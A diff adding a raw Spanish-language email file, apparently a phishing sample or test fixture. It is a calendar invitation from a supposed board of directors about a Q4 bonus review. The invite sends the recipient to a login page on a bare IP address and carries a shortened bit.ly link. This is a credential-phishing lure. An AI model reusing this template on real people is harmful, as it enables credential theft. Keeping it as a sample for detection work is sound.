@@ -1,0 +1,25 @@
+Authentication-Results: mx.google.com; dkim=pass header.i=@agenda-reuniones.top; spf=pass smtp.mailfrom=agenda-reuniones.top; dmarc=pass header.from=agenda-reuniones.top
+From: Junta Directiva <junta@agenda-reuniones.top>
+To: maria@ferreteria-pacifico.com.pa
+Subject: Invitación: Revisión de bonos Q4
+Date: Wed, 7 Oct 2026 09:00:00 -0500
+Message-ID: <22977@agenda-reuniones.top>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1"
+
+--b1
+Content-Type: text/plain; charset=utf-8
+
+Se le ha invitado a una reunión.
+
+--b1
+Content-Type: text/calendar; method=REQUEST; charset=utf-8
+
+BEGIN:VCALENDAR
+BEGIN:VEVENT
+SUMMARY:Revisión de bonos Q4
+DESCRIPTION:Ingrese aquí para ver el documento: http://185.199.110.7/bonos/login
+LOCATION:https://bit.ly/3xYzQq
+END:VEVENT
+END:VCALENDAR
+--b1--
